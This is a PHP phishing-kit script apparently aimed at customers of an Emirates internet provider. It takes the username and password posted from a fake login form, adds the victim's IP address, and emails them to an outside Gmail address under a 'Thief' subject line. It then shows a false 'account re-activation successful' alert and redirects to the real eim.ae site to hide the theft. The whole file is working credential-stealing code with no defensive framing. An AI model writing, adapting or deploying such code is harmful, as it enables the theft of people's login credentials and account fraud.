<?

$ip = getenv("REMOTE_ADDR");
$message .= "----------------------\n";
$message .= "Username: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "----------------------\n";
$message .= "IP: ".$ip."\n";
$recipient = "www.sirhelper@gmail.com";
$subject = "EIM";
$headers = "From: C-Town";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "EIM Spam RezulT(Thief)", $message);

if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
alert('Account re-activation successful!! Thank you for using Emirate.');
window.location='http://www.eim.ae';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>






S